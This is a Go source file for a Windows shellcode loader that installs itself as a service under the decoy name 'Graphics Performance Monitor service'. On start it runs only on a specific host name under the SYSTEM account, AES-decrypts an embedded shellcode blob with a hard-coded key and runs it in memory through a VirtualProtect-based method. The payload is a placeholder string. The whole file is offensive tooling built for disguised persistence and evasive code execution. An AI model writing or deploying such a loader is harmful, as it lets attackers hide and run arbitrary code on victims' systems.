package main

import (
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"log"
	"os"
	"os/user"

	"github.com/kardianos/service"

	"project/internal/crypto/aes"
	"project/internal/module/shellcode"
)

func main() {
	var (
		install   bool
		uninstall bool
	)
	flag.BoolVar(&install, "install", false, "install service")
	flag.BoolVar(&uninstall, "uninstall", false, "uninstall service")
	flag.Parse()

	svcConfig := service.Config{
		Name:        "Graphics Performance Monitor service",
		DisplayName: "Graphics Performance Monitor service",
		Description: "Graphics performance monitor service",
	}
	svc, err := service.New(new(program), &svcConfig)
	if err != nil {
		log.Fatalln(err)
	}

	switch {
	case install:
		err = svc.Install()
		if err != nil {
			log.Fatalln(err)
		}
		log.Println("install service successfully")
	case uninstall:
		err = svc.Uninstall()
		if err != nil {
			log.Fatalln(err)
		}
		log.Println("uninstall service successfully")
	default: // run
		lg, err := svc.Logger(nil)
		if err != nil {
			log.Fatalln(err)
		}
		err = svc.Run()
		if err != nil {
			_ = lg.Error(err)
		}
	}
}

func isTarget() bool {
	hostname, err := os.Hostname()
	if err != nil {
		return false
	}
	if hostname != "host name" {
		return false
	}
	cUser, err := user.Current()
	if err != nil {
		return false
	}
	if cUser.Username != "NT AUTHORITY\\SYSTEM" {
		return false
	}
	return true
}

type program struct{}

func (p *program) Start(_ service.Service) error {
	if !isTarget() {
		return nil
	}
	scCipherData := "encrypted shellcode"
	cipherData, err := hex.DecodeString(scCipherData)
	if err != nil {
		return err
	}
	hash := sha256.New()
	hash.Write([]byte("test"))
	aesKey := hash.Sum(nil)
	shellCode, err := aes.CBCDecrypt(cipherData, aesKey, aesKey[:aes.IVSize])
	if err != nil {
		return err
	}
	go func() {
		err := shellcode.Execute(shellcode.MethodVirtualProtect, shellCode)
		if err != nil {
			log.Fatalln(err)
		}
	}()
	return nil
}

func (p *program) Stop(_ service.Service) error {
	return nil
}
